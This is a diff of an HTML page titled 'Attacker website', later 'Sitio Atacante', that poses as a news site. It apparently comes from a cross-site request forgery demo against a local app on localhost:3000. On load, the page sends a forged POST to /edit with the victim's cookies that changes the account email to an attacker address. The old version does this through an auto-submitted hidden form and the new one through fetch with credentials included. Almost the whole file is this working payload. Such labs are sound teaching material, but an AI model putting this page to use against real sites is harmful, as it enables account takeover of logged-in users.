@@ -1,39 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Attacker website</title>
-</head>
-<body>
-  <div>
-    <h1>
-      Some nice website
-    </h1>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Sitio Atacante</title>
+    </head>
+    <body>
+        <div>
+            <h1>
+                Soy un sitio web de noticias
+            </h1>
+            <!--
     <form name="form" action="http://localhost:3000/edit" method="POST">
       <input type="hidden" name="email" value="hacker@example.com">
     </form>
-  </div>
-  <script>
-    document.form.submit();
+    -->
+        </div>
+        <script>
+            fetch("http://localhost:3000/edit", {
+                method: "POST",
+                credentials: "include",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: "email=correo_hacker@example.com",
+            })
+                .then((res) => console.log(res.status))
+                .catch((err) => console.log(err));
 
-    // fetch('http://localhost:3000/edit', {
-    //   method: 'POST',
-    //   credentials: 'include',
-    //   mode: 'no-cors',
-    //   headers: {
-    //     'Content-Type': 'application/x-www-form-urlencoded',
-    //   },
-    //   body: 'email=hacker@hack.com',
-    // })
-    //   .then(res => console.log(res.status))
-    //   .catch(err => console.log(err));
+            // document.form.submit();
 
+            /*
     fetch('http://localhost:3000/edit', { credentials: 'include' })
       .then(res => res.text())
       .then(html => console.log(html))
-      .catch(err => console.log(err));
-  </script>
-</body>
+      .catch(err => console.log(err));*/
+        </script>
+    </body>
 </html>
